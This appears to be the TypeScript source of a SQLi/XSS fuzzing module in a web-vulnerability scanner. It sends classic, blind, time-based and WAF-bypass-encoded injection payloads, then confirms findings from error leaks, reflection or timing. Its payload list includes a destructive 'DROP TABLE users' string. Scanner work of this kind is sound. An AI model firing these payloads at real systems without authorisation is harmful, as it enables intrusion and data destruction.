/**
 * classicInjection — SQLi / XSS fallback primitives.
 *
 * Reuses existing payload knowledge to fuzz a parameter/endpoint with classic
 * SQL injection and XSS payloads. The oracle reuses observation oracles:
 *   - parseResponse → extract error text snippets / reflected content
 *   - checkWaf      → detect if a WAF blocked the attempt
 *   - findEndpointsInResponse → surface new endpoints leaked by errors
 * Confirmed ONLY when the response evidence (DB error / unescaped reflection)
 * is present AND verified by the EvidenceGate.
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'
import { observeParse, observeWaf, observeEndpoints, observeCompare } from './observers'

const SQLI_PAYLOADS = [
  "'",
  "' OR '1'='1",
  "1' ORDER BY 10-- -",
  "') OR ('1'='1",
  "1; DROP TABLE users-- -",
  "1 AND 1=CONVERT(int,@@version)-- -",
]
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  '${alert(1)}',
  '<svg/onload=alert(1)>',
]
// Blind (boolean) differential + time-based — finds SQLi when no error leaks.
const SQLI_BLIND_TRUE = "' AND '1'='1"
const SQLI_BLIND_FALSE = "' AND '1'='2"
const SQLI_TIME = "1' AND SLEEP(5)-- -"

// WAF-bypass encodings: a server that decodes the payload will reflect the real
// SQLi/XSS, bypassing a naive WAF that only inspects the raw (encoded) bytes.
function wafBypassVariants(p: string): string[] {
  const out = new Set<string>([p])
  try { out.add(encodeURIComponent(p)) } catch { /* ignore */ }
  try { out.add(encodeURIComponent(encodeURIComponent(p))) } catch { /* ignore */ }
  out.add(p.replace(/ /g, '/**/'))
  return [...out]
}

function safeDecode(p: string): string {
  try { return decodeURIComponent(p) } catch { return p }
}

// Multipart/form-data delivery — exercises upload-style param handling.
function multipartBody(param: string, value: string): string {
  const boundary = '----ultimatrix'
  return `--${boundary}\r\nContent-Disposition: form-data; name="${param}"\r\n\r\n${value}\r\n--${boundary}--\r\n`
}
const MULTIPART_CT = 'multipart/form-data; boundary=----ultimatrix'
const SQLI_ERROR_MARKERS = [
  'sql syntax', 'mysql', 'postgresql', 'sqlite', 'sqlstate', 'ora-', 'odbc',
  'syntax error', 'unclosed quotation', 'quoted string', 'you have an error',
  'pg_query', 'unknown column', 'ambiguous column', 'supplied argument',
]

function urlWithParam(url: string, param: string, value: string): string {
  try {
    const u = new URL(url)
    u.searchParams.set(param, value)
    return u.toString()
  } catch {
    return url
  }
}

export const classicInjection: TechniquePrimitive = {
  id: 'classicInjection',
  name: 'Classic Injection (SQLi/XSS)',
  description: 'Fuzz a parameter/endpoint with classic SQL injection and XSS payloads; confirm via DB error leakage or unescaped reflection.',
  technique: 'injection',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    return !!(ctx.param || (ctx.endpoint?.params && ctx.endpoint.params.length > 0))
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const method = ctx.endpoint?.method ?? 'GET'
    const headers = { ...(ctx.sessionHeaders ?? {}) }
    const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'q'

    const steps: AttackStep[] = []
    SQLI_PAYLOADS.forEach((p, i) => {
      const stepUrl = urlWithParam(url, param, p)
      const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
      steps.push({
        id: `sqli-${i}`,
        description: `SQLi payload into ${param}`,
        request: { method, url: stepUrl, headers, ...(body ? { body } : {}) },
        expectedSignal: 'database error message leaked in response',
        metadata: { kind: 'sqli', param, payload: p },
      })
    })
    XSS_PAYLOADS.forEach((p, i) => {
      const stepUrl = urlWithParam(url, param, p)
      const body = method !== 'GET' ? JSON.stringify({ [param]: p }) : undefined
      steps.push({
        id: `xss-${i}`,
        description: `XSS payload into ${param}`,
        request: { method, url: stepUrl, headers, ...(body ? { body } : {}) },
        expectedSignal: 'payload reflected unescaped in response',
        metadata: { kind: 'xss', param, payload: p },
      })
    })
    // Blind boolean differential: a true variant that behaves differently from a
    // false variant is a strong SQLi signal even with no DB error in the body.
    const blindUrlTrue = urlWithParam(url, param, SQLI_BLIND_TRUE)
    const blindUrlFalse = urlWithParam(url, param, SQLI_BLIND_FALSE)
    const blindBodyTrue = method !== 'GET' ? JSON.stringify({ [param]: SQLI_BLIND_TRUE }) : undefined
    const blindBodyFalse = method !== 'GET' ? JSON.stringify({ [param]: SQLI_BLIND_FALSE }) : undefined
    steps.push({
      id: 'sqli-blind-true',
      description: `Blind SQLi boolean-true into ${param}`,
      request: { method, url: blindUrlTrue, headers, ...(blindBodyTrue ? { body: blindBodyTrue } : {}) },
      expectedSignal: 'true variant response differs from false variant',
      metadata: { kind: 'sqli-blind', blind: 'true', param, payload: SQLI_BLIND_TRUE },
    })
    steps.push({
      id: 'sqli-blind-false',
      description: `Blind SQLi boolean-false into ${param}`,
      request: { method, url: blindUrlFalse, headers, ...(blindBodyFalse ? { body: blindBodyFalse } : {}) },
      expectedSignal: 'false variant response differs from true variant',
      metadata: { kind: 'sqli-blind', blind: 'false', param, payload: SQLI_BLIND_FALSE },
    })
    // Time-based: observable via response duration (SLEEP), not body content.
    const timeUrl = urlWithParam(url, param, SQLI_TIME)
    const timeBody = method !== 'GET' ? JSON.stringify({ [param]: SQLI_TIME }) : undefined
    steps.push({
      id: 'sqli-time',
      description: `Time-based SQLi into ${param}`,
      request: { method, url: timeUrl, headers, ...(timeBody ? { body: timeBody } : {}) },
      expectedSignal: 'response delayed (SLEEP)',
      metadata: { kind: 'sqli-time', param, payload: SQLI_TIME },
    })
    // WAF-bypass: encoded variants of a canonical SQLi + XSS payload. A backend
    // that decodes before use reflects the real payload past a naive WAF.
    const wafSeeds: Array<{ base: string; kind: 'sqli' | 'xss' }> = [
      { base: "' OR '1'='1", kind: 'sqli' },
      { base: '<script>alert(1)</script>', kind: 'xss' },
    ]
    wafSeeds.forEach((seed, si) => {
      wafBypassVariants(seed.base).forEach((variant, vi) => {
        if (variant === seed.base) return // raw already covered above
        const stepUrl = urlWithParam(url, param, variant)
        const body = method !== 'GET' ? JSON.stringify({ [param]: variant }) : undefined
        steps.push({
          id: `waf-${seed.kind}-${si}-${vi}`,
          description: `WAF-bypass (${seed.kind}) encoded payload into ${param}`,
          request: { method, url: stepUrl, headers, ...(body ? { body } : {}) },
          expectedSignal: 'encoded payload decoded + reflected/errored past WAF',
          metadata: { kind: seed.kind, wafBypass: true, param, payload: variant, decoded: safeDecode(variant) },
        })
      })
    })
    // Multipart delivery for a canonical SQLi payload (upload-style handlers).
    steps.push({
      id: 'sqli-multipart',
      description: `Multipart-delivered SQLi into ${param}`,
      request: {
        method: method === 'GET' ? 'POST' : method,
        url,
        headers: { ...headers, 'content-type': MULTIPART_CT },
        body: multipartBody(param, "' OR '1'='1"),
      },
      expectedSignal: 'database error leaked via multipart param',
      metadata: { kind: 'sqli', multipart: true, param, payload: "' OR '1'='1" },
    })
    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const evidence: PrimitiveResult['evidence'] = []
    let sqliHit = false
    let xssHit = false
    let wafDetected = false
    const notes: string[] = []

    for (const r of results) {
      const kind = r.step.metadata?.kind
      const body = r.body ?? ''
      const lower = body.toLowerCase()

      const waf = await observeWaf(r.headers ?? {}, body)
      if (waf.detected) wafDetected = true

      if (kind === 'sqli') {
        const parsed = await observeParse(body, r.headers ?? {}, r.status ?? 0)
        const leaked = SQLI_ERROR_MARKERS.some(m => lower.includes(m)) ||
          parsed.textSnippets.some(s => SQLI_ERROR_MARKERS.some(m => s.toLowerCase().includes(m)))
        if (leaked && (r.status ?? 500) < 500) {
          sqliHit = true
          evidence.push({ kind: 'response', label: `SQLi error leaked [${r.step.metadata?.param}] ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: body.slice(0, 1500) })
        }
      } else if (kind === 'xss') {
        const payload = String(r.step.metadata?.payload ?? '')
        const decoded = safeDecode(payload)
        const reflected =
          body.includes(payload) ||
          lower.includes(payload.toLowerCase()) ||
          body.includes(decoded) ||
          lower.includes(decoded.toLowerCase())
        const escaped =
          body.includes(payload.replace(/</g, '&lt;')) ||
          body.includes(decoded.replace(/</g, '&lt;'))
        if (reflected && !escaped) {
          xssHit = true
          evidence.push({
            kind: 'response',
            label: `XSS reflected unescaped [${r.step.metadata?.param}]${r.step.metadata?.wafBypass ? ' (WAF-bypass)' : ''} ${r.step.request.method} ${r.step.request.url} → ${r.status}`,
            data: body.slice(0, 1500),
          })
        }
      }

      // Surface endpoints leaked by verbose errors.
      const endpoints = await observeEndpoints(body, r.step.request.url)
      if (endpoints.length > 0) {
        notes.push(`leaked endpoints: ${endpoints.slice(0, 3).join(', ')}`)
      }
    }

    // Blind (boolean) SQLi: differential between the true and false variants.
    const blindTrue = results.find((r) => r.step.metadata?.blind === 'true')
    const blindFalse = results.find((r) => r.step.metadata?.blind === 'false')
    if (blindTrue && blindFalse && !wafDetected) {
      const cmp = await observeCompare(
        { body: blindTrue.body ?? '', status: blindTrue.status ?? 0 },
        { body: blindFalse.body ?? '', status: blindFalse.status ?? 0 },
      )
      const rawDivergent =
        (blindTrue.status ?? 0) !== (blindFalse.status ?? 0) ||
        (blindTrue.body ?? '').length !== (blindFalse.body ?? '').length
      if (cmp.divergent || rawDivergent) {
        sqliHit = true
        evidence.push({
          kind: 'response',
          label: `Blind SQLi differential [${blindTrue.step.metadata?.param}] divergence=${(cmp.divergence ?? 0).toFixed(2)}`,
          data: `TRUE status=${blindTrue.status} len=${(blindTrue.body ?? '').length} | FALSE status=${blindFalse.status} len=${(blindFalse.body ?? '').length}`,
        })
      }
    }
    // Time-based SQLi: a SLEEP payload visible via response duration.
    const timeR = results.find((r) => r.step.metadata?.kind === 'sqli-time')
    if (timeR && !wafDetected && (timeR.durationMs ?? 0) >= 2000) {
      sqliHit = true
      evidence.push({
        kind: 'response',
        label: `Time-based SQLi [${timeR.step.metadata?.param}] delay=${timeR.durationMs}ms`,
        data: (timeR.body ?? '').slice(0, 800),
      })
    }

    const category = sqliHit ? 'sql_injection' : xssHit ? 'xss' : undefined
    const { verified } = evidenceGate.verifyClaim(
      claimFor(category ?? 'injection', results[0]?.step.request.url, results[0]?.status, results[0]?.step.request.method),
    )
    const observed = sqliHit || xssHit
    const confirmed = observed && verified

    return {
      confirmed,
      confidence: confirmed ? 0.8 : observed ? 0.4 : 0.05,
      evidence,
      severity: confirmed ? 'high' : undefined,
      finding: confirmed
        ? {
            category,
            description: `${category === 'sql_injection' ? 'SQL injection' : 'XSS'} confirmed on ${results[0]?.step.request.url ?? ''} (param ${results[0]?.step.metadata?.param}).`,
            request: results[0]?.step.request,
            response: { status: results[0]?.status ?? 0, body: (evidence[0]?.data ?? '').slice(0, 1000) },
            cwe: category === 'sql_injection' ? 'CWE-89' : 'CWE-79',
          }
        : undefined,
      note: `sqliHit=${sqliHit} xssHit=${xssHit} waf=${wafDetected} verified=${verified}${notes.length ? '; ' + notes.join('; ') : ''}`,
    }
  },
}
